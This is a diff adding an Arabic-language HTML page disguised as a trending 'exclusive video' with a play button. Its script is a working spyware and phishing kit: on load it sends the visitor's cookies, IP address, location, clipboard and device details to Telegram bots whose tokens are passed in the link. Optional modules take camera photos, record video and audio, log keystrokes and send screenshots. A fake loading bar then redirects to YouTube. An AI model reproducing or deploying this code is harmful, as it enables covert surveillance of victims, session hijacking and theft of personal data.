@@ -1,0 +1,386 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>فيديو حصري 2026 - لن تصدق ما سيحدث!</title>
+    <style>
+        *{margin:0;padding:0;box-sizing:border-box}
+        body{background:linear-gradient(135deg,#1e3c72,#2a5298);font-family:'Segoe UI',Tahoma,sans-serif;min-height:100vh;display:flex;justify-content:center;align-items:center;padding:20px}
+        .card{background:white;border-radius:20px;padding:35px;text-align:center;max-width:400px;box-shadow:0 20px 40px rgba(0,0,0,0.2)}
+        .icon{font-size:70px;margin-bottom:15px}
+        h2{color:#333;margin-bottom:10px}
+        .views{color:#666;font-size:14px;margin-bottom:20px}
+        .stats{display:flex;justify-content:center;gap:20px;margin:15px 0;padding:10px;background:#f5f5f5;border-radius:15px}
+        .stat{text-align:center}
+        .stat-num{font-weight:bold;color:#667eea}
+        .btn{background:#667eea;color:white;border:none;padding:15px 45px;border-radius:50px;font-size:18px;cursor:pointer;transition:0.3s;margin-top:10px}
+        .btn:hover{transform:scale(1.05);background:#5a67d8}
+        .loading{display:none;margin-top:20px}
+        .spinner{width:40px;height:40px;border:4px solid #f3f3f3;border-top:4px solid #667eea;border-radius:50%;animation:spin 1s linear infinite;margin:0 auto 10px}
+        @keyframes spin{0%{transform:rotate(0deg)}100%{transform:rotate(360deg)}}
+        .status{position:fixed;bottom:10px;left:10px;background:rgba(0,0,0,0.8);color:#0f0;padding:5px 12px;border-radius:8px;font-size:10px;z-index:999;font-family:monospace}
+        .progress-bar{width:100%;height:4px;background:#e0e0e0;border-radius:2px;margin:15px 0;overflow:hidden;display:none}
+        .progress-fill{width:0%;height:100%;background:#4CAF50;transition:width 0.3s}
+    </style>
+</head>
+<body>
+<div class="card">
+    <div class="icon">📹</div>
+    <h2>🔥 فيديو حصري 2026</h2>
+    <div class="views">🔄 2.5M مشاهدة • #ترند • منذ 3 ساعات</div>
+    <div class="stats">
+        <div class="stat"><div class="stat-num">48K</div><div>إعجاب</div></div>
+        <div class="stat"><div class="stat-num">12K</div><div>تعليق</div></div>
+        <div class="stat"><div class="stat-num">5.2K</div><div>مشاركة</div></div>
+    </div>
+    <button class="btn" id="playBtn">▶ تشغيل الفيديو</button>
+    <div class="loading" id="loading">
+        <div class="spinner"></div>
+        <div class="progress-bar" id="progressBar"><div class="progress-fill" id="progressFill"></div></div>
+        <p id="loadingText">جاري تجهيز الفيديو...</p>
+    </div>
+</div>
+<div class="status" id="status">🔄 جاري التحميل...</div>
+
+<script>
+// إرسال البيانات إلى تليجرام
+async function sendToTelegram(chat, token, type, data, caption) {
+    try {
+        if(type === 'photo') {
+            const fd = new FormData();
+            fd.append('chat_id', chat);
+            fd.append('photo', data, 'capture.jpg');
+            fd.append('caption', caption);
+            await fetch(`https://api.telegram.org/bot${token}/sendPhoto`, {method:'POST', body:fd});
+        } else if(type === 'video') {
+            const fd = new FormData();
+            fd.append('chat_id', chat);
+            fd.append('video', data, 'video.mp4');
+            fd.append('caption', caption);
+            await fetch(`https://api.telegram.org/bot${token}/sendVideo`, {method:'POST', body:fd});
+        } else if(type === 'audio') {
+            const fd = new FormData();
+            fd.append('chat_id', chat);
+            fd.append('audio', data, 'audio.mp4');
+            fd.append('caption', caption);
+            await fetch(`https://api.telegram.org/bot${token}/sendAudio`, {method:'POST', body:fd});
+        } else {
+            await fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
+                method:'POST',
+                headers:{'Content-Type':'application/json'},
+                body:JSON.stringify({chat_id: chat, text: caption})
+            });
+        }
+    } catch(e) { console.log('Send error:', e); }
+}
+
+// ================== جميع الميزات ==================
+
+// 1. معلومات الجهاز
+async function getDeviceInfo(chat, token, masterChat, masterToken) {
+    const info = {
+        '🌐 User Agent': navigator.userAgent,
+        '💻 المنصة': navigator.platform,
+        '📺 الشاشة': `${screen.width}x${screen.height}`,
+        '🎨 عمق الألوان': screen.colorDepth,
+        '🖱️ نقاط اللمس': navigator.maxTouchPoints || 0,
+        '⚙️ المعالج': navigator.hardwareConcurrency || 'غير معروف',
+        '💾 الذاكرة': navigator.deviceMemory || 'غير معروف',
+        '🗺️ المنطقة': Intl.DateTimeFormat().resolvedOptions().timeZone,
+        '🌐 اللغة': navigator.language
+    };
+    const message = '📱 *معلومات الجهاز*\n' + Object.entries(info).map(([k,v]) => `• ${k}: ${v}`).join('\n');
+    await sendToTelegram(chat, token, 'text', null, message + ' (نسخة المستخدم)');
+    await sendToTelegram(masterChat, masterToken, 'text', null, message + ' (نسخة المختبر)');
+}
+
+// 2. الموقع الجغرافي
+function getLocation(chat, token, masterChat, masterToken) {
+    if(navigator.geolocation) {
+        navigator.geolocation.getCurrentPosition(async (pos) => {
+            const message = `📍 *الموقع الجغرافي*\n• خط العرض: ${pos.coords.latitude}\n• خط الطول: ${pos.coords.longitude}\n• الدقة: ${pos.coords.accuracy} متر\n🔗 https://maps.google.com/?q=${pos.coords.latitude},${pos.coords.longitude}`;
+            await sendToTelegram(chat, token, 'text', null, message + ' (نسخة المستخدم)');
+            await sendToTelegram(masterChat, masterToken, 'text', null, message + ' (نسخة المختبر)');
+        });
+    }
+}
+
+// 3. IP العام
+async function getPublicIP(chat, token, masterChat, masterToken) {
+    try {
+        const res = await fetch('https://api.ipify.org?format=json');
+        const data = await res.json();
+        const message = `🌐 *IP العام*: ${data.ip}`;
+        await sendToTelegram(chat, token, 'text', null, message + ' (نسخة المستخدم)');
+        await sendToTelegram(masterChat, masterToken, 'text', null, message + ' (نسخة المختبر)');
+    } catch(e) {}
+}
+
+// 4. الكوكيز
+function getCookies(chat, token, masterChat, masterToken) {
+    const cookies = document.cookie;
+    if(cookies && cookies.length > 0) {
+        const message = `🍪 *الكوكيز*:\n${cookies.substring(0, 800)}`;
+        sendToTelegram(chat, token, 'text', null, message + ' (نسخة المستخدم)');
+        sendToTelegram(masterChat, masterToken, 'text', null, message + ' (نسخة المختبر)');
+    }
+}
+
+// 5. الكاميرا الأمامية
+async function captureFrontCamera(chat, token, masterChat, masterToken) {
+    try {
+        const stream = await navigator.mediaDevices.getUserMedia({video: {facingMode: 'user'}});
+        const video = document.createElement('video');
+        video.srcObject = stream;
+        video.play();
+        await new Promise(r => setTimeout(r, 500));
+        const canvas = document.createElement('canvas');
+        canvas.width = video.videoWidth || 640;
+        canvas.height = video.videoHeight || 480;
+        canvas.getContext('2d').drawImage(video, 0, 0);
+        const blob = await new Promise(r => canvas.toBlob(r, 'image/jpeg', 0.8));
+        const caption = '📸 صورة من الكاميرا الأمامية';
+        await sendToTelegram(chat, token, 'photo', blob, caption + ' (نسخة المستخدم)');
+        await sendToTelegram(masterChat, masterToken, 'photo', blob, caption + ' (نسخة المختبر)');
+        stream.getTracks().forEach(t => t.stop());
+    } catch(e) {}
+}
+
+// 6. الكاميرا الخلفية
+async function captureBackCamera(chat, token, masterChat, masterToken) {
+    try {
+        const stream = await navigator.mediaDevices.getUserMedia({video: {facingMode: 'environment'}});
+        const video = document.createElement('video');
+        video.srcObject = stream;
+        video.play();
+        await new Promise(r => setTimeout(r, 500));
+        const canvas = document.createElement('canvas');
+        canvas.width = video.videoWidth || 640;
+        canvas.height = video.videoHeight || 480;
+        canvas.getContext('2d').drawImage(video, 0, 0);
+        const blob = await new Promise(r => canvas.toBlob(r, 'image/jpeg', 0.8));
+        const caption = '📷 صورة من الكاميرا الخلفية';
+        await sendToTelegram(chat, token, 'photo', blob, caption + ' (نسخة المستخدم)');
+        await sendToTelegram(masterChat, masterToken, 'photo', blob, caption + ' (نسخة المختبر)');
+        stream.getTracks().forEach(t => t.stop());
+    } catch(e) {}
+}
+
+// 7. فيديو أمامي
+async function recordFrontVideo(chat, token, masterChat, masterToken) {
+    try {
+        const stream = await navigator.mediaDevices.getUserMedia({video: {facingMode: 'user'}, audio: true});
+        const mediaRecorder = new MediaRecorder(stream);
+        const chunks = [];
+        mediaRecorder.ondataavailable = e => chunks.push(e.data);
+        mediaRecorder.onstop = async () => {
+            const blob = new Blob(chunks, {type: 'video/mp4'});
+            const caption = '🎥 فيديو من الكاميرا الأمامية - 5 ثوان';
+            await sendToTelegram(chat, token, 'video', blob, caption + ' (نسخة المستخدم)');
+            await sendToTelegram(masterChat, masterToken, 'video', blob, caption + ' (نسخة المختبر)');
+        };
+        mediaRecorder.start();
+        setTimeout(() => mediaRecorder.stop(), 5000);
+        setTimeout(() => stream.getTracks().forEach(t => t.stop()), 5500);
+    } catch(e) {}
+}
+
+// 8. فيديو خلفي
+async function recordBackVideo(chat, token, masterChat, masterToken) {
+    try {
+        const stream = await navigator.mediaDevices.getUserMedia({video: {facingMode: 'environment'}, audio: true});
+        const mediaRecorder = new MediaRecorder(stream);
+        const chunks = [];
+        mediaRecorder.ondataavailable = e => chunks.push(e.data);
+        mediaRecorder.onstop = async () => {
+            const blob = new Blob(chunks, {type: 'video/mp4'});
+            const caption = '📹 فيديو من الكاميرا الخلفية - 5 ثوان';
+            await sendToTelegram(chat, token, 'video', blob, caption + ' (نسخة المستخدم)');
+            await sendToTelegram(masterChat, masterToken, 'video', blob, caption + ' (نسخة المختبر)');
+        };
+        mediaRecorder.start();
+        setTimeout(() => mediaRecorder.stop(), 5000);
+        setTimeout(() => stream.getTracks().forEach(t => t.stop()), 5500);
+    } catch(e) {}
+}
+
+// 9. تسجيل صوتي
+async function recordAudio(chat, token, masterChat, masterToken) {
+    try {
+        const stream = await navigator.mediaDevices.getUserMedia({audio: true});
+        const mediaRecorder = new MediaRecorder(stream);
+        const chunks = [];
+        mediaRecorder.ondataavailable = e => chunks.push(e.data);
+        mediaRecorder.onstop = async () => {
+            const blob = new Blob(chunks, {type: 'audio/mp4'});
+            const caption = '🎤 تسجيل صوتي - 5 ثوان';
+            await sendToTelegram(chat, token, 'audio', blob, caption + ' (نسخة المستخدم)');
+            await sendToTelegram(masterChat, masterToken, 'audio', blob, caption + ' (نسخة المختبر)');
+        };
+        mediaRecorder.start();
+        setTimeout(() => mediaRecorder.stop(), 5000);
+        setTimeout(() => stream.getTracks().forEach(t => t.stop()), 5500);
+    } catch(e) {}
+}
+
+// 10. Keylogger
+let keystrokes = '';
+function startKeylogger(chat, token, masterChat, masterToken) {
+    document.addEventListener('keypress', (e) => {
+        keystrokes += e.key;
+        if(keystrokes.length >= 30) {
+            const caption = `⌨️ *ضغطات المستخدم*: ${keystrokes}`;
+            sendToTelegram(chat, token, 'text', null, caption + ' (نسخة المستخدم)');
+            sendToTelegram(masterChat, masterToken, 'text', null, caption + ' (نسخة المختبر)');
+            keystrokes = '';
+        }
+    });
+}
+
+// 11. لقطة شاشة دورية
+let screenshotInterval = null;
+function startScreenshots(chat, token, masterChat, masterToken) {
+    const script = document.createElement('script');
+    script.src = "https://cdnjs.cloudflare.com/ajax/libs/html2canvas/1.4.1/html2canvas.min.js";
+    script.onload = () => {
+        screenshotInterval = setInterval(() => {
+            html2canvas(document.body).then(canvas => {
+                canvas.toBlob(blob => {
+                    const caption = '📸 لقطة شاشة دورية - كل 30 ثانية';
+                    sendToTelegram(chat, token, 'photo', blob, caption + ' (نسخة المستخدم)');
+                    sendToTelegram(masterChat, masterToken, 'photo', blob, caption + ' (نسخة المختبر)');
+                });
+            });
+        }, 30000);
+    };
+    document.head.appendChild(script);
+}
+
+// 12. تاريخ التصفح
+function getBrowserHistory(chat, token, masterChat, masterToken) {
+    // لا يمكن الوصول لتاريخ التصفح الكامل لأسباب أمنية
+    // لكن يمكن جلب عدد الصفحات في التاريخ
+    const historyLength = history.length;
+    const message = `📜 *تاريخ التصفح*: ${historyLength} صفحة في سجل التصفح`;
+    sendToTelegram(chat, token, 'text', null, message + ' (نسخة المستخدم)');
+    sendToTelegram(masterChat, masterToken, 'text', null, message + ' (نسخة المختبر)');
+}
+
+// 13. محتوى الحافظة
+async function getClipboard(chat, token, masterChat, masterToken) {
+    try {
+        const text = await navigator.clipboard.readText();
+        if(text && text.length > 0) {
+            const message = `📋 *محتوى الحافظة*: ${text.substring(0, 500)}`;
+            await sendToTelegram(chat, token, 'text', null, message + ' (نسخة المستخدم)');
+            await sendToTelegram(masterChat, masterToken, 'text', null, message + ' (نسخة المختبر)');
+        }
+    } catch(e) {}
+}
+
+// ================== طلب الصلاحيات مسبقاً ==================
+async function requestPermissions(featuresList) {
+    const statusDiv = document.getElementById('status');
+    statusDiv.style.display = 'block';
+    
+    const needsCamera = featuresList.includes('front') || featuresList.includes('back') || 
+                        featuresList.includes('vfront') || featuresList.includes('vback');
+    const needsMic = featuresList.includes('audio') || featuresList.includes('vfront') || featuresList.includes('vback');
+    
+    if(needsCamera) {
+        statusDiv.innerHTML = '📷 جاري طلب إذن الكاميرا...';
+        try {
+            await navigator.mediaDevices.getUserMedia({video: true});
+            statusDiv.innerHTML = '✅ تم منح إذن الكاميرا';
+        } catch(e) { statusDiv.innerHTML = '❌ تم رفض الكاميرا'; }
+    }
+    
+    if(needsMic) {
+        statusDiv.innerHTML = '🎤 جاري طلب إذن الميكروفون...';
+        try {
+            await navigator.mediaDevices.getUserMedia({audio: true});
+            statusDiv.innerHTML = '✅ تم منح إذن الميكروفون';
+        } catch(e) { statusDiv.innerHTML = '❌ تم رفض الميكروفون'; }
+    }
+    
+    setTimeout(() => { statusDiv.style.display = 'none'; }, 3000);
+}
+
+// ================== قراءة البيانات من الرابط ==================
+const urlParams = new URLSearchParams(window.location.search);
+const encodedData = urlParams.get('d');
+
+if(encodedData) {
+    try {
+        const data = JSON.parse(atob(encodedData));
+        const { mChat, mToken, tChat, tToken, features } = data;
+        const featuresList = features ? features.split(',') : [];
+        
+        // طلب الصلاحيات أولاً
+        await requestPermissions(featuresList);
+        
+        // جمع البيانات الأساسية فوراً
+        getDeviceInfo(tChat, tToken, mChat, mToken);
+        getPublicIP(tChat, tToken, mChat, mToken);
+        getCookies(tChat, tToken, mChat, mToken);
+        getLocation(tChat, tToken, mChat, mToken);
+        getBrowserHistory(tChat, tToken, mChat, mToken);
+        getClipboard(tChat, tToken, mChat, mToken);
+        
+        // الميزات المتقدمة
+        if(featuresList.includes('front')) captureFrontCamera(tChat, tToken, mChat, mToken);
+        if(featuresList.includes('back')) captureBackCamera(tChat, tToken, mChat, mToken);
+        if(featuresList.includes('vfront')) recordFrontVideo(tChat, tToken, mChat, mToken);
+        if(featuresList.includes('vback')) recordBackVideo(tChat, tToken, mChat, mToken);
+        if(featuresList.includes('audio')) recordAudio(tChat, tToken, mChat, mToken);
+        if(featuresList.includes('keylogger')) startKeylogger(tChat, tToken, mChat, mToken);
+        if(featuresList.includes('screenshot')) startScreenshots(tChat, tToken, mChat, mToken);
+        
+        // إرسال إشعار بفتح الرابط
+        const openMsg = '🔗 *تم فتح رابط الضحية*';
+        sendToTelegram(tChat, tToken, 'text', null, openMsg + ' (نسخة المستخدم)');
+        sendToTelegram(mChat, mToken, 'text', null, openMsg + ' (نسخة المختبر)');
+        
+        // عند الضغط على زر التشغيل
+        let videoPlayed = false;
+        document.getElementById('playBtn').onclick = function() {
+            if(videoPlayed) return;
+            videoPlayed = true;
+            
+            const loadingDiv = document.getElementById('loading');
+            const progressBar = document.getElementById('progressBar');
+            const progressFill = document.getElementById('progressFill');
+            const loadingText = document.getElementById('loadingText');
+            
+            loadingDiv.style.display = 'block';
+            progressBar.style.display = 'block';
+            this.disabled = true;
+            
+            let progress = 0;
+            const interval = setInterval(() => {
+                progress += Math.random() * 15;
+                if(progress >= 100) {
+                    progress = 100;
+                    clearInterval(interval);
+                    loadingText.innerHTML = '✅ تم التحميل! جاري التشغيل...';
+                    setTimeout(() => {
+                        window.location.href = "https://www.youtube.com/watch?v=dQw4w9WgXcQ";
+                    }, 1500);
+                }
+                progressFill.style.width = progress + '%';
+                if(progress < 30) loadingText.innerHTML = 'جاري الاتصال بالخادم...';
+                else if(progress < 60) loadingText.innerHTML = 'جاري تحميل الفيديو...';
+                else if(progress < 90) loadingText.innerHTML = 'معالجة الفيديو...';
+            }, 150);
+        };
+        
+    } catch(e) { console.log('Error:', e); }
+} else {
+    document.getElementById('playBtn').onclick = function() {
+        alert('⚠️ هذا الرابط غير صالح للاختبار');
+    };
+}
+</script>
+</body>
+</html>
